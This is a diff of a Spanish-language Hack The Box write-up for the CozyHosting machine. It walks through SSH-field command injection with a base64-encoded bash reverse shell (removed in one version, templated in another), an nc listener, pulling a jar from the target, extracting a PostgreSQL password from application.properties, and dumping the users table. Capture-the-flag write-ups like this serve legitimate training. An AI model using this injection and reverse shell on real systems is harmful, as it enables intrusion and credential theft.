@@ -99,43 +99,106 @@ dirsearch -u http://cozyhosting.htb/
   ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/7b2d3b5c-90f8-4eb4-8db1-e471dbce261a)
 - Hacemos pruebas. Podemos repetir el paso anterior pero con el Burpsuite activo y ver como funciona. 
 
-## inyección de shell
+## inyección de shell o shell reverso
 -Si revisamos la pagina, nos daremos cuenta que hay un apartado de SSH. Lo cual nos puede servir para entrar directamente a su servicio por medio de inyección de shell y Burpsuite
 - **`¿Que es la inyección de shell?**:La inyección de comandos se refiere a una vulnerabilidad en la que un atacante puede insertar comandos maliciosos o instrucciones en una entrada de datos que luego se ejecutan en el sistema objetivo a través de una conexión SSH u otro protocolo.
 ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/da3f192a-28e4-4ff4-9754-1c15cdcf9e9a)
 
 - Procedemos a escribir 
-- Usario:
- ```localhost```
--   Contraseña:
-  ```kanderson;echo${IFS}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4zLzk5OTkgMD4mMQ=="|base64${IFS}-d|bash;```
+- Hostname:
+ ```127.0.0.1```
+-   Usario:
+  ```Kanderson```
 -   Ya ingresado, revisamos el Burpsuite
-![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/afc53d27-78bb-44ab-969f-e6c2fa362e4d)
-- Click Derehco y send to repeater
-- Si tarda en respondernos es buena señal
-![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/caff2d63-f748-4199-9633-e8fed77d0b35)
--Ahora iniciamos la virtual machine para descargar el jar python3 -m
-```http.server 9999  ```
-- El siguiente paso es saber nuestra ip, para ello usamos
-- ```ifconfig ```
-- La ip esta en ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/60f6410c-ddf6-4e72-a7a0-796317875ae1)
-
-- La copiamos y lo pegamos
-- Ya con la ip usamos este comando
-```curl "TUIP BORRA LAS COMILLAS" :9999/cloudhosting-0.0.1.jar > cloudhosting.jar```
-- Si todo salio bien, nos saldra algo asi. Lo que significa que se descargo con exito.
-![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/76099734-7371-4c0e-b4e9-d967a80c2cfe)
-- Luego buscamos donde esta el archivo con
-```ls```
-- El archivo se encuentra descargado
-![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/648326ce-04f0-478f-93a7-0f40a50fd1c1)
--La maquina que iniciamos nos lo confirma
-![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/a4f32b05-7bfa-4d10-b4ca-271be93cf83a)
-
-- Al abrir el archvivo nos muestra lo siguiente
-- 
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/a5e664ab-e645-4cb0-9b37-4a4b20dcf342)
+- Luego Crt + r para ir el repeater
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/f4ec75dc-cad5-4aef-814d-7e54783743a2)
+- Lo que haremos es un shell a la reversa. Entramos a esta url https://www.revshells.com/ y ponemos la ip que sacamos del paso del ifconfig y ponemos el puerto 4444 que usaremos para entrar al ssh.
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/f1bf208e-2043-41a4-ae39-bee4d87d78a3)
+- Nos aseguramos en que este en Base64
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/6e5e98e0-058e-439c-bd04-f6fcd84826c2)
+- Ya con eso, lo decoficamos en
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/1a13d55e-5e29-4b85-a7c2-1bd67768bf76)
+- Copiamos todo lo que nos dio y lo pegamos entrete esto
+- kanderson;echo${IFS}"ELNUMEROQUETEDIO_NOBORRESLASCOMILLAS"|base64${IFS}-d|bash;
+- lo pegamos en nuestro Burp
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/c707a2c2-1b47-4c57-9908-be49db5042ef)
+- Le damos en enviar y en nuestra terminal escribimos ```nc -lnvp 4444```
+- Si todo salio bien, nos saldra algo asi.
+- ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/b9ba4dc9-de16-48bf-8012-ff862837a6b9)
+- Revisamos que hay con ```ls``` y vemos que hay un archivo Jar
+*Solo como dato, el puerto puede variar, eso ya depende del gusto de cada usario y de lo que vayan encontrando*
 
 
-      
+## cloudhosting.jar
+- Revisamos el archivo.
+- Si intentamos hacerle un unzip, nos lo negara. Asi que haremos lo siguiente
+
+```
+python3 -m http.server 9999
+```
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/3e934152-8fd5-4c8d-b735-7909e71dd2ed)
+```
+wget cozyhosting.htb:9999/cloudhosting-0.0.1.jar
+```
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/31e078e6-9f58-4294-b57e-a797431a6921)
+```
+unzip cloudhosting-0.0.1.jar
+```
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/513fb33c-ad7a-4da0-8a56-d63ab85ca38f)
+- Le damos un Ls para ver que nos extrajo
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/aaf2119a-0852-46a7-8f8d-090705b21995)
+*No se asusten si ven que yo tengo mas archivos, el detalle es que yo lo intente varias veces, pero los importantes son las carpetas*
+- Revisamos lo usarios
+  ```
+  grep -r username
+  ```
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/00229160-234f-4951-b91e-d3fd16346c00)
+
+- De lo encontrado, nos interesa esto
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/56229dfb-1169-4f7c-8786-8731e916ea79)
+
+```
+cat BOOT-INF/classes/application.properties
+```
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/c1841dbe-10dc-4d13-b2a2-49d23b756461)
+
+- Identificamos que "spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting" 
+- E igual, algo que nos servira en el siguiente paso
+  ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/e804b562-8cb8-4bb0-a90d-0d4f2354a1d0)
+- username=postgres
+- password=Vg&nvzAQ7XxR 
 
 
+## POSTGRESQL
+Regresamos al ssh
+*Simplemente, apreta ctrl + c para que el puerto 9999 deje de funcionar. Vuelve a poner el nc y envia en burp lo que ya teniamos para volver a iniciar el ssh, por si te confundiste*
+
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/44ed47b9-d9f0-487d-980a-8213835dd902)
+
+- accedemos al postgres
+  ```
+  psql -h localhost -d cozyhosting -U postgres
+  ```
+- Nos pedira una contraseña, que es la que sacamos en el paso anterior "password=Vg&nvzAQ7XxR"
+- ![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/4810f169-f79f-495e-aaa5-943e17817eef)
+- revisamos las tablas
+```
+\l
+```
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/2c29a57a-844a-43dc-9dfc-bc23771bf364)
+
+*salimos con una letra y entener*
+Nos sirve, pero no es lo que buscamos.
+```
+\d
+```
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/9f9f1481-2d16-4ce9-8175-d94ce6a475ef)
+
+- Ya con esto, nos salimos con q + enter y ponemos el siguiente SQL
+```
+SELECT * FROM users;
+```
+![image](https://github.com/JESUSLUG/CozyHosting-Guia-CTF-HACK-THE-BOX-/assets/116361712/7bb1b99b-931f-4296-a0db-41b7a68a2c11)
+
+- Esto es lo que buscamos, el unico detalle es que las contraseñas estan hasheadas. 
